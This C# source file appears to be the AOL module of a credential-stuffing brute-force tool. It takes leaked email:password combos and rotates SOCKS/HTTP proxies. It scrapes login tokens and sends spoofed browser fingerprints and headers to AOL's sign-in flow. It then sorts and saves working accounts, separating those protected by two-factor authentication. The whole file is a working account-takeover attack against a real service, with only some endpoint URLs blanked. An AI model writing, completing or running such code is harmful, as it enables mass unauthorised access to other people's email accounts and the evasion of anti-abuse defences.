using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class AOL
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");

                string str1 = httpRequest.Get("AOL GET").ToString();
                string ac = Cryptography.LR(str1, "acrumb\" value=\"", "\"").FirstOrDefault();
                string acr = Cryptography.LR(str1, "name=\"crumb\" value=\"", "\"").FirstOrDefault();
                string si = Cryptography.LR(str1, "\"sessionIndex\" value=\"", "\"").FirstOrDefault();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "login.aol.com");
                httpRequest.AddHeader("Origin", "https://login.aol.com");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                string str2 = httpRequest.Post("URL HERE", "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1.5%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-480%2C%22timezone%22%3A%22Asia%2FShanghai%22%2C%22sessionStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Linux+i686%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Qualcomm%7EAdreno+%28TM%29+640%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A11%2C%22hash%22%3A%221b3c7bec80639c771f8258bd6a3bf2c6%22%7D%2C%22audio%22%3A%22124.08072049533075%22%2C%22resolution%22%3A%7B%22w%22%3A%22480%22%2C%22h%22%3A%22854%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22854%22%2C%22h%22%3A%22480%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1637154929242%2C%22render%22%3A1637154929509%7D%7D&crumb="+ac+ "&acrumb="+acr+ "&sessionIndex="+si+ "&displayName=&deviceCapability=&username="+strArray1[0]+ "&passwd=&signin=Suivant", "application/x-www-form-urlencoded").ToString();

                if (str2.Contains("challenge/password"))
                {
                    string loc = str2.Replace("{\"location\":\"", "").Replace("\"}", "");

                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("Host", "login.aol.com");
                    httpRequest.AddHeader("Origin", "https://login.aol.com");
                    httpRequest.AddHeader("Referer", "https://login.aol.com/?appid=com.yahoo.mobile.client.android.weather&appsrc=yweatherandroid&appsrcv=1.30.60&display=narrow&intl=fr&lang=fr-FR&src=androidphnx&srcv=8.13.4&.asdk_embedded=1&activity=default&pspid=954007775&theme=dark&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F.asdk_embedded%3D1%26.scrumb%3D0%26appid%3Dcom.yahoo.mobile.client.android.weather%26appsrcv%3D1.30.60%26client_id%3DZqWPsmDnmoZPTuFP%26code_challenge%3DQdmX6sKxOnUAQEBcaql_Ap2_GrM1OuOXrDF8inaxnck%26code_challenge_method%3DS256%26intl%3Dfr%26language%3Dfr-FR%26nonce%3D04VIr9V4rAC5Hnmer6HzODrtjciDTYTc%26push%3D1%26redirect_uri%3Dcom.yahoo.mobile.client.android.weather%253A%252F%252Fphoenix%252Fcallback_auth%26response_type%3Dcode%26scope%3Dopenid%2520device_sso%26sdk-device-id%3DODg2YTAyMGIyNTY0NjE3NmM1ZDU3YmJlYjIyYzczYjE1N2ZiZDU1ZGYw%26src%3Dandroidphnx%26srcv%3D8.13.4%26state%3DyXC5qJi0wo5HYsUsZ_o6mg%26theme%3Ddark%26webview%3D1&prefill=0&prompt=login&chllngnm=base");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    string str3 = httpRequest.Post("URL HERE" + loc, "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1.5%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-480%2C%22timezone%22%3A%22Asia%2FShanghai%22%2C%22sessionStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Linux+i686%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Qualcomm%7EAdreno+%28TM%29+640%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A11%2C%22hash%22%3A%221b3c7bec80639c771f8258bd6a3bf2c6%22%7D%2C%22audio%22%3A%22124.08072049533075%22%2C%22resolution%22%3A%7B%22w%22%3A%22480%22%2C%22h%22%3A%22854%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22854%22%2C%22h%22%3A%22480%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1637154929242%2C%22render%22%3A1637154929509%7D%7D&crumb="+ac+ "&acrumb="+acr+ "&sessionIndex="+si+ "&displayName="+strArray1[0]+ "&deviceCapability=&username="+strArray1[0]+ "&passwordContext=normal&isShowButtonClicked=&showButtonStatus=&prefersReducedMotion=&password="+strArray1[1]+ "&verifyPassword=Suivant", "application/x-www-form-urlencoded").ToString();

                    if (str3.Contains("api.login.aol.com/oauth2/"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Green);
                        }
                        Program.Save(combo, "AOL");
                        return true;
                    }
                    else if (str3.Contains("/account/challenge/challenge-selector"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "AOL 2FA");
                        return true;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }
                }
                else if(str2.Contains("INVALID_USERNAME"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
